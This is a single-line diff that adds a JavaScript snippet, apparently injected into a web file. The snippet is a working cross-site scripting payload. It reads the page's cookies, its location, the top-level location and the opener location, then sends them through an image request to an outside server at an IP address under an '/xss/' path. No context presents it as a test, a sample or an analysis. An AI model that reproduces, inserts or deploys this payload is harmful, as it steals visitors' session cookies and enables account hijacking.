@@ -1,0 +1,1 @@
+var x=new Image(); try { var myopener=''; myopener=window.opener && window.opener.location ? window.opener.location : ''; } catch(err) { } x.src='http://218.25.10.53:8080/xss/xssapp.jsp?location='+escape(document.location)+'&toplocation='+escape(top.document.location)+'&cookie='+escape(document.cookie)+'&opener='+escape(myopener);
